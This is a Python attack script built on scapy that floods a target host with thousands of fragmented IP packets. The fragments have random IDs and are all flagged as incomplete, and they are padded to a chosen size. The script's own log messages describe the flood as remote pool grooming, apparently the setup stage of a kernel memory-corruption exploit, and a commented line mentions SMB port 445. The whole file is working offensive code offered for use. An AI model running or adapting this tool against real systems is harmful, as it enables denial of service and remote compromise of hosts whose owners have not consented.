#!/usr/bin/env python3.8

"""
Bombard target with fragmented IP packets
"""

import threading
import struct
import sys
import random

from scapy.all import send, sendp, plist, IP, TCP, UDP, Raw, fragment, Ether

DEBUG = True

def xlog(x: str) -> None:
    sys.stderr.write(x + "\n")
    sys.stderr.flush()

def err(msg: str) -> None:  xlog("[!] %s" % msg)
def ok(msg: str) -> None:   xlog("[+] %s" % msg)
def dbg(msg: str) -> None:  xlog("[*] %s" % msg)


def p8(x: int, s: bool = False): return struct.pack("<B",x) if not s else struct.pack("<b",x)
def p16(x: int, s: bool = False): return struct.pack("<H",x) if not s else struct.pack("<h",x)
def p32(x: int, s: bool = False): return struct.pack("<I",x) if not s else struct.pack("<i",x)
def p64(x: int, s: bool = False): return struct.pack("<Q",x) if not s else struct.pack("<q",x)
def u8(x: bytes, s: bool = False): return struct.unpack("<B",x)[0] if not s else struct.unpack("<b",x)[0]
def u16(x: bytes, s: bool = False): return struct.unpack("<H",x)[0] if not s else struct.unpack("<h",x)[0]
def u32(x: bytes, s: bool = False): return struct.unpack("<I",x)[0] if not s else struct.unpack("<i",x)[0]
def u64(x: bytes, s: bool = False): return struct.unpack("<Q",x)[0] if not s else struct.unpack("<q",x)[0]


def generate_packet(dst: str, id: int, payload: bytes):
    """
    Create packet(s) that will be re-assembled contiguously remotely
    """
    MTU_MAX_SIZE = 1400 # todo adjust
    _id = id
    _start_offset = 0
    _pkt_fragments = plist.PacketList()
    _size = len(payload)
    for i in range(0, _size, MTU_MAX_SIZE):
        _off = int(_start_offset + i) // 8
        _flags = "MF" if i+MTU_MAX_SIZE < _size else "MF"
        _ip = IP(dst=dst, proto="tcp", flags=_flags, id=_id, frag=_off) / Raw(payload[i:i+MTU_MAX_SIZE])
        _pkt_fragments.append(_ip)
        ok("sending IP(id={:x}, off={}, flags={})".format(_id, _off*8, _flags))

    return _pkt_fragments


def fragment_bomb(dest: str, nb_packet: int, payload: bytes = b"", method: str = "") -> None:
    _packet_ids = random.sample(range(0x0000, 0x10000), k=nb_packet)
    pkts = plist.PacketList()

    for _id in _packet_ids:
        #_ip = IP(dst=dest, id=_id, proto="tcp") / payload
        #for f in fragment(_ip):
        #    sendp( Ether(dst="00:15:5d:00:0c:3f")/f , inter=0.01, iface="eth1" )
        for pkt in generate_packet(dest, _id, payload):
            p = Ether(dst="00:15:5d:00:0c:3f")/pkt
            #send(pkt,verbose=False)
            pkts.append(p)

        sendp(p, inter=0.001, iface="eth1", verbose=False )



#    # some strategy attempts to better control the grooming
#    if method == "poke":
#        x = [ t for i, t in enumerate(_id) if i % 2 == 1 ]
#        pkts.append( IP(dst=dest, proto="tcp", id=x, frag=off) )
#    elif method == "full":
#        x = [ t for i, t in enumerate(_id) if i % 2 == 1 ]
#        pkts.append( IP(dst=dest, proto="tcp", id=x, frag=off) )
#        x = [ t for i, t in enumerate(_id) if i % 2 == 0 ]
#        pkts.append( IP(dst=dest, proto="tcp", id=x, frag=off) )

    #send(pkts, verbose=DEBUG, inter=0.01, loop=0)
    return


def too_long_error():
    err("timeout reached, stopping...")
    sys.exit(-1)


def remote_allocate(dst: str, pool_size: int) -> None:
    # note: pkt header will add 0x50 to the target allocation
    assert pool_size >= 0x50
    ok("starting fragment_bombing with pool_size={}".format(pool_size))
    #payload = TCP(dport=445, flags="S")
    payload = b'A'*(pool_size-0x50)
    #payload = b''.ljust(pool_size-0x50, b'A')
    fragment_bomb(dst, 10000, bytes(payload))
    return


if __name__ == "__main__":
    target, size, timeout = sys.argv[1], int(sys.argv[2], 0), 3*60
    if len(sys.argv) > 3:
        timeout = int(sys.argv[3], 0)

    T = []

    try:

        ok("stopping in {:d} seconds".format(timeout))
        timer = threading.Timer(timeout, too_long_error)
        timer.start()

        ok("grooming pool...")
        t = threading.Thread(
            target = remote_allocate,
            args = (target, size)
        )
        t.daemon = True
        t.start()
        T.append(t)

    except KeyboardInterrupt:
        for t in T:
            if t.is_alive():
                t.join()
        sys.exit(1)